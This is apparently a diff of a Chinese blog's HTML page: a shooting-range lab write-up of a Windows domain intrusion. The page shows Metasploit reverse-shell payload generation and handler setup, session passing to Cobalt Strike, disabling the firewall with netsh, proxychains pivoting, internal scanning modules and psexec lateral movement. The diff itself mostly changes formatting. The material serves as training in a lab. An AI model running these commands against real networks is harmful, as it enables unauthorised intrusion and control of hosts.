@@ -172,7 +172,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/" style="color: #00bcd4">靶场实战</a>
+                <a href="/tags/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/" style="color: #03a9f4">靶场实战</a>
             </span>
             
         </span>
@@ -244,14 +244,14 @@ SET GLOBAL general_log_file=&#39;C:\\phpStudy\\WWW\\shell.php&#39; # 这里可�
 <p>找到路径直接连接就行</p>
 <p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304182308862.png" alt="image-20230418230819829"></p>
 <h4 id="系统信息收集"><a href="#系统信息收集" class="headerlink" title="系统信息收集"></a>系统信息收集</h4><h5 id="msf反弹shell"><a href="#msf反弹shell" class="headerlink" title="msf反弹shell"></a>msf反弹shell</h5><p>拿到shell了首先尝试提权，这里使用msf生成木马</p>
-<pre><code class="zsh">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.220.128 lport=8888 -f exe -o shell.exe
+<pre><code class="bash">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.220.128 lport=8888 -f exe -o shell.exe
 </code></pre>
 <p>生成的shell.exe通过蚁剑上传到win7，然后在msf中开启监听</p>
 <p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304191638164.png" alt="image-20230419163819112"></p>
 <blockquote>
 <p>它给我比心了，它喜欢我</p>
 </blockquote>
-<pre><code class="msf">use exploit/multi/handler
+<pre><code class="bash">use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
 set LHOST 192.168.220.128
 set LPORT 8888
@@ -269,12 +269,12 @@ migrate 3000 #这里我的进程号是3000
 </code></pre>
 <h5 id="联动Cobalt-Strike"><a href="#联动Cobalt-Strike" class="headerlink" title="联动Cobalt Strike"></a>联动Cobalt Strike</h5><p>或者可以将meterpreter的shell派生到<a target="_blank" rel="noopener" href="https://www.123pan.com/s/ulbbVv-pni63.html?SharePwd=dV01">Cobalt Strike</a>上</p>
 <p>打开CS能看到有客户端和服务端，先开服务端，用</p>
-<pre><code class="shell"># bash teamserver ip password
+<pre><code class="bash"># bash teamserver ip password
 bash teamserver 192.168.220.128 123456
 </code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304231755126.png" alt="image-20230423175503070"></p>
 <p>然后去开启客户端</p>
-<pre><code class="shell"># Windows下双击cobaltstrike-client.cmd，kali直接把cmd改为sh
+<pre><code class="bash"># Windows下双击cobaltstrike-client.cmd，kali直接把cmd改为sh
 bash cobaltstrike-client.sh
 </code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304231759346.png" alt="image-20230423175917317"></p>
@@ -283,7 +283,7 @@ bash cobaltstrike-client.sh
 <p>创建一个listener，类似handler</p>
 <p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304232102615.png" alt="image-20230423210257575"></p>
 <p>修改一下端口，然后save，之后去msf的meterpreter中</p>
-<pre><code class="msf">background
+<pre><code class="bash">background
 use exploit/windows/local/payload_inject
 set payload windows/meterpreter/reverse_http
 set lhost 192.168.220.128 # HTTP Host(Stager)
@@ -339,11 +339,11 @@ use auxiliary/scanner/discovery/udp_sweep
 set rhosts 192.168.52.0/24
 </code></pre>
 <p>找出来了三个存活ip，然后就可以写出ip表</p>
-<pre><code class="iptables">192.168.52.138 #域控 2008
+<pre><code class="iptables">192.168.52.138 #域控 2008 
 192.168.52.143 #web网关服务器 win7
 192.168.52.141 #域成员 2K3
 </code></pre>
-<h5 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h5><pre><code class="meterpreter">shell
+<h5 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h5><pre><code class="shell">shell #进meterpreter
 netsh advfirewall set allprofiles state off
 </code></pre>
 <h5 id="nmap扫描端口"><a href="#nmap扫描端口" class="headerlink" title="nmap扫描端口"></a>nmap扫描端口</h5><p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304241000426.png" alt="image-20230424100031373"></p>
@@ -366,7 +366,7 @@ jobs #查看任务是否成功执行
 <pre><code class="bash">vim /etc/proxychains4.conf
 </code></pre>
 <p>在proxylist下添加</p>
-<pre><code class="vim">socks4 127.0.0.1 1080
+<pre><code class="tex">socks4 127.0.0.1 1080
 </code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202305062233827.png" alt="image-20230506223347771"></p>
 <p>然后是全局代理测试</p>
@@ -387,18 +387,18 @@ jobs #查看任务是否成功执行
 <p>kali中出现</p>
 <p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202305080013517.png" alt="image-20230508001336439"></p>
 <p>即为连接成功，然后去msf中设置代理</p>
-<pre><code class="msf">set Proxies socks5:127.0.0.1:6000
+<pre><code class="bash">set Proxies socks5:127.0.0.1:6000
 set ReverseAllowProxy true
 </code></pre>
 <h4 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h4><p>msf内置信息搜索模块</p>
 <pre><code class="bash">auxiliary/scanner/discovery/udp_sweep    #基于udp协议发现内网存活主机
-auxiliary/scanner/discovery/udp_probe    #基于udp协议发现内网存活主机
+auxiliary/scanner/discovery/udp_probe    	#基于udp协议发现内网存活主机
 auxiliary/scanner/netbios/nbname         #基于netbios协议发现内网存活主机
-auxiliary/scanner/portscan/tcp           #基于tcp进行端口扫描(默认扫描1-10000)
+auxiliary/scanner/portscan/tcp           	#基于tcp进行端口扫描(默认扫描1-10000)
 auxiliary/scanner/ftp/ftp_version            #发现内网ftp服务，基于默认21端口
 auxiliary/scanner/ssh/ssh_version            #发现内网ssh服务，基于默认22端口
 auxiliary/scanner/telnet/telnet_version      #发现内网telnet服务，基于默认23端口
-auxiliary/scanner/dns/dns_amp                #发现dns服务，基于默认53端口
+auxiliary/scanner/dns/dns_amp                	#发现dns服务，基于默认53端口
 auxiliary/scanner/http/http_version          #发现内网http服务，基于默认80端口
 auxiliary/scanner/http/title                 #探测内网http服务的标题
 auxiliary/scanner/smb/smb_version            #发现内网smb服务，基于默认的445端口   
@@ -414,9 +414,9 @@ auxiliary/scanner/netbios/nbname             #探测内网主机的netbios名字
 <pre><code class="bash">proxychains nmap -Pn -sT 192.168.52.0/24
 </code></pre>
 <h4 id="控制域内主机"><a href="#控制域内主机" class="headerlink" title="控制域内主机"></a>控制域内主机</h4><p>由于知道密码，所以直接使用psexec</p>
-<pre><code class="msf">search psexec 
-use 4
-options
+<pre><code class="msf">search psexec   #搜索
+use 4			#通过序号使用
+options			#查看选项
 </code></pre>
 <p>options配置可参考</p>
 <p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202305080021301.png" alt="image-20230508002111235"></p>
